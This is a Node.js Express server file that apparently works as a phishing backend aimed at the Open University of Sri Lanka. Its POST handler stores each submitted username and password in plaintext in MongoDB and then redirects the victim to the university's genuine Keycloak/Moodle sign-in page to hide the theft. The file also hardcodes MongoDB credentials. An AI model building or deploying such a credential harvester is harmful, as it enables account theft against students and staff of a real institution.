// server.js

const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

/* MongoDB connection
mongoose.connect('mongodb+srv://missari:missari123@cluster0.2uqs2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch((error) => console.error('MongoDB connection error:', error)); */

//

// MongoDB connection
const mongoURI = process.env.MONGODB_URI || 'mongodb+srv://missari:missari123@cluster0.2uqs2.mongodb.net/mydatabase?retryWrites=true&w=majority';
mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch((error) => console.error('MongoDB connection error:', error));


// Define User schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model('User', userSchema);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'))); // Serve static files from "public" directory

// Serve index.html as the homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login.html when accessing /login route
app.get('/submit-form', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// POST endpoint to handle login form submission -- /submit form is data colecting pdf document name in mongoDb
app.post('/submit-form', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Save user data to MongoDB
    const newUser = new User({ username, password });
    await newUser.save();

    // Redirect on success
    res.redirect('https://iam.ou.ac.lk:8443/realms/ousl_ad_oulms/protocol/openid-connect/auth?client_id=oulmsmoodlecid&response_type=code&redirect_uri=https%3A%2F%2Foulms.ou.ac.lk%2Fadmin%2Foauth2callback.php&state=%2Fauth%2Foauth2%2Flogin.php%3Fwantsurl%3Dhttps%253A%252F%252Foulms.ou.ac.lk%252F%26sesskey%3DXhoefrzFS5%26id%3D4&scope=openid%20profile%20email');
  } catch (error) {
    console.error('Error saving data to MongoDB:', error);
    res.status(500).send('Server error');
  }
});


// Start the server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
});

